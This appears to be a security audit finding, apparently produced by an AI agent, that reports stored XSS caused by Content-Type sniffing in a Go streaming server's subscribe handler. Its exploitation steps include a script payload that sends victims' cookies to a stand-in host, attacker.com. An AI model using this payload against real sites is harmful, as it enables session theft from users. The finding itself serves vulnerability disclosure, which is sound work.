---
agent_num: 3
provider: claude
---

## Vulnerability: Stored XSS via Content-Type Sniffing in the Subscribe Handler

### Location

`main.go:98` — the `subscribe()` handler's `w.Write(data)` call.

### Root Cause

The `subscribe` handler streams broadcaster history to HTTP clients **without setting a `Content-Type` header**:

```go
// main.go:92-102
cursor := 0
for {
    data, ok := b.Read(r.Context(), &cursor)
    if !ok {
        return
    }
    if _, err := w.Write(data); err != nil { //nolint:gosec // raw audio stream, not HTML
        return
    }
    flusher.Flush()
}
```

When `Content-Type` is not explicitly set, Go's `http.ResponseWriter.Write()` calls `http.DetectContentType()` on the first write, sniffing the first 512 bytes using the MIME detection algorithm. If the data starts with `<html>`, `<!DOCTYPE`, or other HTML signatures, Go sets `Content-Type: text/html; charset=utf-8`.

The `broadcast` handler (`main.go:119-138`) accepts arbitrary bytes via `io.ReadAll(r.Body)` with no content validation or sanitization, and stores them in the broadcaster's history buffer permanently. The `//nolint:gosec` comment on line 98 explicitly suppresses the security linter, assuming data is "raw audio stream, not HTML" — but nothing enforces this assumption.

This is the **parallel logic gap**: the `broadcast` path accepts any content type (no validation on input), while the `subscribe` path trusts the data to be safe for raw output (no sanitization on output). Neither side enforces the "audio only" invariant that the `nolint` comment assumes.

### Exploitation Scenario

1. **Create a station:**
   ```
   POST /station?id=music HTTP/1.1
   ```

2. **Inject HTML/JS payload as broadcast data:**
   ```
   POST /station/broadcast?id=music HTTP/1.1
   Content-Type: application/octet-stream

   <html><script>document.location='https://attacker.com/steal?c='+document.cookie</script></html>
   ```

3. **Payload persists in `b.history`** — it is never evicted and is served to every new subscriber.

4. **Victim opens the listener URL in a browser:**
   ```
   GET /station/listen?id=music
   ```

5. Go's `DetectContentType` sniffs `<html>` → sets response header `Content-Type: text/html; charset=utf-8`.

6. **Browser renders the response as HTML**, executing the attacker's JavaScript in the victim's browser context.

Because history is append-only and never cleared, every subsequent listener to that station also gets the XSS payload as the first data written. The attacker can also use innocuous station names (e.g., `top-hits`, `news`) to lure victims.

### Impact

- Arbitrary JavaScript execution in victim browsers
- Session/cookie theft
- Phishing via attacker-controlled page content rendered from a trusted origin
- Affects all users who subscribe to the poisoned station, now and in the future (persistent/stored)

### Severity: **High**

This matches the definition: *"Stored XSS that executes in other users' sessions."* The payload is stored in the broadcaster's history buffer and executes in every listener's browser session via Go's automatic content-type sniffing.
